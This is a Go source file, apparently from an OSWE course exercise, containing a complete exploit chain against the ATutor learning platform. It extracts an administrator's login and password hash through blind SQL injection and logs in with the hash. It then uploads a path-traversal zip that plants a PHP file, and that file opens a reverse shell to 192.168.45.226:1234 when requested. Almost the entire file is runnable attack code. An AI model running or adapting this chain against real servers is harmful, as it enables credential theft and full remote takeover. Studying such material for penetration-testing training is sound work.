package main

import (
	"archive/zip"
	"crypto/sha1"
	"crypto/tls"
	"encoding/hex"
	"flag"
	"fmt"
	"github.com/iPhantasmic/OSWE/scripts/utils"
	"io"
	"log"
	"net/http"
	"net/http/cookiejar"
	"net/url"
	"os"
	"regexp"
	"strings"
	"sync"
)

// Ex 3.9.4.2 - Extra Mile: Full chain exploit
// SQLi -> Login -> Create & Upload Zip -> Trigger RCE
// extra source has been added to multithread the SQLi function

var client *http.Client

const proxyURL = "http://127.0.0.1:8080"

// helper functions
func sendSearchFriendsSQLiFinal(ip string, sqliPayload string) int {
	for i := 32; i < 126; i++ {
		// do necessary URL manipulation
		updatedPayload := strings.Replace(sqliPayload, "[CHAR]", fmt.Sprintf("%d", i), -1)
		requestURL := fmt.Sprintf("http://%s/ATutor/mods/_standard/social/index_public.php?q=%s", ip, updatedPayload)

		// send the request
		contentLength := utils.SendGetRequest(client, false, requestURL).ContentLength

		if contentLength > 0 {
			return i
		}
	}

	return 0
}

func getLengthFinal(ip string, subquery string, lower, upper int) int {
	for i := lower; i < upper; i++ {
		updatedPayload := fmt.Sprintf("test')/**/or/**/(select/**/length((%s)))=%d%%23", subquery, i)
		requestURL := fmt.Sprintf("http://%s/ATutor/mods/_standard/social/index_public.php?q=%s", ip, updatedPayload)

		// send the request
		contentLength := utils.SendGetRequest(client, false, requestURL).ContentLength

		if contentLength > 0 {
			return i
		}
	}

	return 0
}

func generateHashFinal(hashedPassword string, token string) string {
	hasher := sha1.New()

	concatenated := hashedPassword + token
	utils.PrintInfo("Intermediate string: " + concatenated)
	hasher.Write([]byte(concatenated))

	finalHash := hex.EncodeToString(hasher.Sum(nil))
	utils.PrintInfo("Final hash: " + finalHash)

	return finalHash
}

// stage 1
func getUsername(ip string) string {
	usernameQuery := "select/**/login/**/from/**/AT_members/**/where/**/status=3/**/limit/**/1"
	userLen := getLengthFinal(ip, usernameQuery, 1, 10)
	utils.PrintInfo(fmt.Sprintf("Length of username: %d", userLen))

	// create wait group for multithreading requests
	var wg sync.WaitGroup
	wg.Add(userLen)
	username := make([]rune, userLen)

	utils.PrintInfo("Extracting username...")
	for i := 1; i < userLen+1; i++ {
		sqliPayload := fmt.Sprintf("test')/**/or/**/(ascii(substring((%s),%d,1)))=[CHAR]%%23", usernameQuery, i)
		//extractedChar := fmt.Sprintf("%c", sendSearchFriendsSQLiFinal(ip, sqliPayload))
		go func(i int) {
			defer wg.Done()
			username[i-1] = rune(sendSearchFriendsSQLiFinal(ip, sqliPayload))
		}(i)
	}

	wg.Wait()

	utils.PrintSuccess("Username is: " + string(username))
	return string(username)
}

// stage 2
func getPassword(ip, username string) string {
	passwordQuery := fmt.Sprintf("select/**/password/**/from/**/AT_members/**/where/**/status=3/**/and/**/login='%s'", username)
	passwordLen := getLengthFinal(ip, passwordQuery, 30, 50)
	utils.PrintInfo(fmt.Sprintf("Length of password: %d", passwordLen))

	// create wait group for multithreading requests
	var wg sync.WaitGroup
	wg.Add(passwordLen)
	password := make([]rune, passwordLen)

	utils.PrintInfo("Extracting password hash...")
	for i := 1; i < passwordLen+1; i++ {
		sqliPayload := fmt.Sprintf("test')/**/or/**/(ascii(substring((%s),%d,1)))=[CHAR]%%23", passwordQuery, i)
		//extractedChar := fmt.Sprintf("%c", sendSearchFriendsSQLiFinal(ip, sqliPayload))
		go func(i int) {
			defer wg.Done()
			password[i-1] = rune(sendSearchFriendsSQLiFinal(ip, sqliPayload))
		}(i)
	}

	wg.Wait()

	utils.PrintSuccess("Password hash is: " + string(password))
	return string(password)
}

// stage 3
func loginFinal(debug bool, ip, user, hash string) bool {
	// do necessary URL manipulation
	requestURL := fmt.Sprintf("http://%s/ATutor/login.php", ip)

	token := "pwned"
	hashed := generateHashFinal(hash, token)

	// prepare POST request body (form)
	data := url.Values{
		"form_password_hidden": {hashed},
		"form_login":           {user},
		"submit":               {"Login"},
		"token":                {token},
	}

	// send the request
	response := utils.SendPostRequest(client, debug, requestURL, utils.PostRequest{
		ContentType: "form",
		Cookies:     []*http.Cookie{},
		FormData:    data,
		JsonData:    "",
	})

	// regex for evidence of successful login
	match1, _ := regexp.MatchString("Create Course: My Start Page", response.ResponseBody)
	match2, _ := regexp.MatchString("My Courses: My Start Page", response.ResponseBody)
	if match1 || match2 {
		return true
	}

	return false
}

// stage 4
func buildBadZipFinal() {
	archive := utils.CreateZipFile("final.zip")
	defer archive.Close()
	zipWriter := zip.NewWriter(archive)

	phpPayload := "<?php exec(\"/bin/bash -c 'bash -i > /dev/tcp/192.168.45.226/1234 0>&1'\");"

	// poc.txt with file traversal
	utils.CreateFile("reverse.phtml", phpPayload)
	file1, err := os.Open("reverse.phtml")
	if err != nil {
		log.Fatalln("Error while opening reverse.phtml", err)
	}
	defer file1.Close()

	utils.PrintInfo("Writing reverse.phtml to zip archive...")
	writer1, err := zipWriter.Create("../../../../../../../../../../var/www/html/ATutor/mods/poc/reverse.phtml")
	if err != nil {
		log.Fatalln("Error while creating reverse.phtml", err)
	}

	_, err = io.Copy(writer1, file1)
	if err != nil {
		log.Fatalln("Error while writing file to zip archive...", err)
	}

	// imsmanifest.xml
	utils.CreateFile("imsmanifest.xml", "invalid XML!")
	file2, err := os.Open("imsmanifest.xml")
	if err != nil {
		log.Fatalln("Error while opening imsmanifest.xml", err)
	}
	defer file2.Close()

	utils.PrintInfo("Writing imsmanifest.xml to zip archive...")
	writer2, err := zipWriter.Create("imsmanifest.xml")
	if err != nil {
		log.Fatalln("Error while creating imsmanifest.xml", err)
	}

	_, err = io.Copy(writer2, file2)
	if err != nil {
		log.Fatalln("Error while writing file to zip archive...", err)
	}

	utils.PrintSuccess("Finished writing and closing zip archive!")
	zipWriter.Close()
}

// stage 5
func uploadZip(debug bool, ip string) bool {
	// we need to first access the course that we want the test to be uploaded for otherwise it will fail
	requestURL := fmt.Sprintf("http://%s/ATutor/bounce.php?course=16777215", ip)
	utils.PrintInfo("Accessing course page...")
	utils.SendGetRequest(client, debug, requestURL)

	// do necessary URL manipulation
	requestURL = fmt.Sprintf("http://%s/ATutor/mods/_standard/tests/import_test.php", ip)

	utils.PrintInfo("Uploading zip file...")
	response := utils.SendPostRequest(client, debug, requestURL, utils.PostRequest{
		ContentType: "multipart",
		Cookies:     []*http.Cookie{},
		FormData:    url.Values{},
		JsonData:    "",
		MultipartData: map[string]string{
			"file":          "@final.zip",
			"submit_import": "Import",
		},
	})

	return response.StatusCode == 200 && strings.Contains(response.ResponseBody, "XML error")
}

// stage 6
func triggerRCE(debug bool, ip string) {
	// do necessary URL manipulation
	requestURL := fmt.Sprintf("http://%s/ATutor/mods/poc/reverse.phtml", ip)

	utils.PrintInfo("Triggering reverse shell, check listener!")
	_ = utils.SendGetRequest(client, debug, requestURL)
}

func main() {
	var tr *http.Transport
	useProxy := flag.Bool("proxy", false, "use proxy")
	debug := flag.Bool("debug", false, "debug mode")
	flag.Parse()
	// parse args
	args := os.Args[:]
	log.Println("Args: ", args)

	if len(args) < 2 {
		utils.PrintFailure(fmt.Sprintf("usage: %s [-proxy=<proxyIP>] <target>", os.Args[0]))
		utils.PrintFailure(fmt.Sprintf("eg: %s 192.168.121.103", os.Args[0]))
		os.Exit(1)
	}

	ip := flag.Arg(0)

	if *useProxy {
		// disable TLS verification and set proxy URL
		proxyUrl, _ := url.Parse(proxyURL)
		tr = &http.Transport{
			TLSClientConfig:    &tls.Config{InsecureSkipVerify: true},
			DisableCompression: true, // to ensure that we can obtain Content-Length response header
			Proxy:              http.ProxyURL(proxyUrl),
		}
	} else {
		tr = &http.Transport{
			TLSClientConfig:    &tls.Config{InsecureSkipVerify: true},
			DisableCompression: true, // to ensure that we can obtain Content-Length response header
		}
	}

	// cookie jar to help us manage cookies
	jar, err := cookiejar.New(nil)
	if err != nil {
		log.Fatalln("Error while creating cookie jar", err)
	}

	// create our HTTP client using the above transport and cookie jar, then set the global variable
	client = &http.Client{
		Transport: tr,
		Jar:       jar,
	}

	username := getUsername(ip)
	passwordHash := getPassword(ip, username)

	if loginFinal(*debug, ip, username, passwordHash) {
		utils.PrintSuccess("Successfully logged in!")
	} else {
		log.Fatalln("Failed to login... Check proxy logs!")
	}

	buildBadZipFinal()

	if uploadZip(*debug, ip) {
		utils.PrintSuccess("Successfully uploaded zip!")
	} else {
		log.Fatalln("Failed to upload zip... Check proxy logs!")
	}

	triggerRCE(*debug, ip)

	fmt.Println("")
	utils.PrintSuccess("Done!")
}
